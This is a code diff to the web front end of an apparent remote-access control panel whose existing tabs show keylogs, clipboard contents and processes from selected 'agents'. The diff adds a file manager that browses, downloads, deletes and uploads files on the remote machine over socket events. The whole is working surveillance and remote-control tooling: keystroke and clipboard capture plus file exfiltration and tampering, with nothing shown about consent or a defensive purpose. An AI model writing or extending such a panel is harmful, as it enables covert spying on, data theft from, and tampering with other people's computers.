@@ -105,6 +105,30 @@
   #control-panel input[type=checkbox] { accent-color:#7c6aff; }
   .hotkey-hint { font-size:10px; color:#444; margin-top:5px; }
 
+  /* ── File Manager ──────────────────────────────────────────────────────── */
+  #fm-path-bar { display:flex; align-items:center; gap:5px; padding:6px 8px; background:#1a1a1a; border-bottom:1px solid #2a2a2a; flex-shrink:0; flex-wrap:wrap; }
+  #fm-path-bar span { font-size:10px; color:#7c6aff; }
+  #fm-breadcrumb { flex:1; min-width:0; font-size:11px; color:#aaa; word-break:break-all; }
+  #fm-up-btn { background:#2a2a2a; border:none; color:#aaa; padding:3px 9px; border-radius:4px; cursor:pointer; font-size:12px; font-family:inherit; flex-shrink:0; }
+  #fm-up-btn:hover { background:#7c6aff; color:#fff; }
+  #fm-upload-btn { background:#2a2a2a; border:none; color:#aaa; padding:3px 9px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; flex-shrink:0; }
+  #fm-upload-btn:hover { background:#1a6640; color:#4ade80; }
+
+  #fm-list { flex:1; overflow-y:auto; }
+  #fm-list::-webkit-scrollbar { width:4px; }
+  #fm-list::-webkit-scrollbar-thumb { background:#333; }
+  .fm-row { display:flex; align-items:center; gap:8px; padding:6px 10px; border-bottom:1px solid #1a1a1a; cursor:pointer; font-size:11px; }
+  .fm-row:hover { background:#151515; }
+  .fm-icon { font-size:13px; flex-shrink:0; }
+  .fm-name { flex:1; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:#ddd; }
+  .fm-meta { font-size:10px; color:#555; flex-shrink:0; white-space:nowrap; }
+  .fm-actions { display:flex; gap:4px; flex-shrink:0; }
+  .fm-dl-btn { background:#1a2a3a; border:none; color:#60a5fa; padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
+  .fm-dl-btn:hover { background:#2563eb; color:#fff; }
+  .fm-del-btn { background:#3a1a1a; border:none; color:#f87171; padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
+  .fm-del-btn:hover { background:#c0392b; color:#fff; }
+  #fm-status { font-size:10px; color:#555; padding:5px 10px; text-align:center; flex-shrink:0; }
+
   /* ── Mobile ──────────────────────────────────────────────────────────────── */
   #sidebar-handle { display:none; }
 
@@ -214,6 +238,7 @@
       <div class="tab active" onclick="switchTab('keylog')">Keylog</div>
       <div class="tab" onclick="switchTab('clipboard')">Clipboard</div>
       <div class="tab" onclick="switchTab('processes')">Processes</div>
+      <div class="tab" onclick="switchTab('files')">Files</div>
     </div>
 
     <div id="tab-keylog" class="tab-panel active">
@@ -250,6 +275,16 @@
       </div>
       <div class="proc-header"><span>Name</span><span style="text-align:right">CPU%</span><span style="text-align:right">MB</span><span></span></div>
       <div id="proc-list"></div>
+    </div>
+
+    <div id="tab-files" class="tab-panel">
+      <div id="fm-path-bar">
+        <span>📂</span>
+        <div id="fm-breadcrumb">/</div>
+        <button id="fm-up-btn" onclick="fmUp()" title="Up">↑ Up</button>
+        <label id="fm-upload-btn" title="Upload file">⬆ Upload<input type="file" id="fm-upload-input" style="display:none" multiple onchange="fmUpload(this)"></label>
+      </div>
+      <div id="fm-list"><div id="fm-status">Select an agent and open Files tab</div></div>
     </div>
 
     <div id="control-panel">
@@ -376,13 +411,14 @@ function target() { return selectedAgent; }
 
 // ── Tabs ──────────────────────────────────────────────────────────────────────
 function switchTab(name) {
+  const names = ["keylog", "clipboard", "processes", "files"];
   document.querySelectorAll(".tab").forEach((t, i) => {
-    const names = ["keylog", "clipboard", "processes"];
     t.className = "tab" + (names[i] === name ? " active" : "");
   });
   document.querySelectorAll(".tab-panel").forEach(p => p.className = "tab-panel");
   document.getElementById("tab-" + name).className = "tab-panel active";
   if (name === "processes") loadProcs();
+  if (name === "files") fmLoadDir(fmCurPath || null);
 }
 
 // ── Screen ────────────────────────────────────────────────────────────────────
@@ -584,6 +620,117 @@ document.addEventListener("keyup", e => {
 // ── Sidebar toggle (mobile) ───────────────────────────────────────────────────
 function toggleSidebar() {
   document.getElementById("sidebar").classList.toggle("collapsed");
+}
+
+// ── File Manager ──────────────────────────────────────────────────────────────
+let fmCurPath = null;
+const fmList  = document.getElementById("fm-list");
+const fmBread = document.getElementById("fm-breadcrumb");
+
+function fmSetStatus(msg) { fmList.innerHTML = `<div id="fm-status">${escHtml(msg)}</div>`; }
+
+function fmLoadDir(path) {
+  if (!selectedAgent) { fmSetStatus("No agent selected"); return; }
+  fmSetStatus("Loading…");
+  socket.emit("list_dir", { path: path || null, _target: selectedAgent });
+}
+
+socket.on("dir_result", d => {
+  if (!d) return;
+  fmCurPath = d.path;
+  fmBread.textContent = d.path;
+  if (d.error) { fmSetStatus("Error: " + d.error); return; }
+  const files = d.files || [];
+  if (!files.length) { fmList.innerHTML = '<div id="fm-status">Empty directory</div>'; return; }
+  fmList.innerHTML = files.map(f => {
+    const icon = f.type === "dir" ? "📁" : "📄";
+    const size = f.type === "file" ? fmFmtSize(f.size) : "";
+    const nameAttr = escAttr(d.path + "/" + f.name);
+    const nameAttrPath = escAttr(d.path.replace(/\\/g,"/") + "/" + f.name);
+    const actions = f.type === "file"
+      ? `<div class="fm-actions">
+           <button class="fm-dl-btn" onclick="event.stopPropagation();fmDownload('${nameAttr}','${escAttr(f.name)}')">DL</button>
+           <button class="fm-del-btn" onclick="event.stopPropagation();fmDelete('${nameAttr}')">Del</button>
+         </div>`
+      : `<div class="fm-actions"><button class="fm-del-btn" onclick="event.stopPropagation();fmDelete('${nameAttr}')">Del</button></div>`;
+    const onclick = f.type === "dir" ? `fmLoadDir('${nameAttrPath}')` : `fmDownload('${nameAttr}','${escAttr(f.name)}')`;
+    return `<div class="fm-row" onclick="${onclick}">
+      <span class="fm-icon">${icon}</span>
+      <span class="fm-name" title="${escAttr(f.name)}">${escHtml(f.name)}</span>
+      <span class="fm-meta">${escHtml(size)}</span>
+      ${actions}
+    </div>`;
+  }).join("");
+});
+
+function fmUp() {
+  if (!fmCurPath) return;
+  const parts = fmCurPath.replace(/\\/g,"/").split("/").filter(Boolean);
+  if (parts.length <= 1) { fmLoadDir("/"); return; }
+  parts.pop();
+  fmLoadDir("/" + parts.join("/"));
+}
+
+function fmDownload(path, name) {
+  if (!selectedAgent) return;
+  fmSetStatus("Downloading " + name + "…");
+  socket.emit("read_file", { path, _target: selectedAgent });
+}
+
+socket.on("file_data", d => {
+  if (!d) return;
+  if (d.error) { fmSetStatus("Error: " + d.error); return; }
+  try {
+    const binary = atob(d.data);
+    const bytes = new Uint8Array(binary.length);
+    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+    const blob = new Blob([bytes]);
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url; a.download = d.name || "file";
+    document.body.appendChild(a); a.click();
+    document.body.removeChild(a); URL.revokeObjectURL(url);
+  } catch(e) { fmSetStatus("Download failed"); return; }
+  fmLoadDir(fmCurPath);
+});
+
+function fmDelete(path) {
+  if (!selectedAgent) return;
+  if (!confirm("Delete:\n" + path + "\n\nThis cannot be undone.")) return;
+  socket.emit("delete_path", { path, _target: selectedAgent });
+}
+
+socket.on("delete_result", d => {
+  if (!d) return;
+  if (!d.ok) { alert("Delete failed: " + (d.error || "unknown error")); }
+  fmLoadDir(fmCurPath);
+});
+
+function fmUpload(input) {
+  if (!selectedAgent || !input.files.length) return;
+  Array.from(input.files).forEach(file => {
+    const reader = new FileReader();
+    reader.onload = e => {
+      const b64 = btoa(String.fromCharCode(...new Uint8Array(e.target.result)));
+      const destPath = (fmCurPath || "").replace(/\\/g,"/").replace(/\/+$/,"") + "/" + file.name;
+      socket.emit("write_file", { path: destPath, data: b64, _target: selectedAgent });
+    };
+    reader.readAsArrayBuffer(file);
+  });
+  input.value = "";
+}
+
+socket.on("write_result", d => {
+  if (!d) return;
+  if (!d.ok) { alert("Upload failed: " + (d.error || "unknown error")); return; }
+  fmLoadDir(fmCurPath);
+});
+
+function fmFmtSize(b) {
+  if (b < 1024) return b + " B";
+  if (b < 1048576) return (b/1024).toFixed(1) + " KB";
+  if (b < 1073741824) return (b/1048576).toFixed(1) + " MB";
+  return (b/1073741824).toFixed(1) + " GB";
 }
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
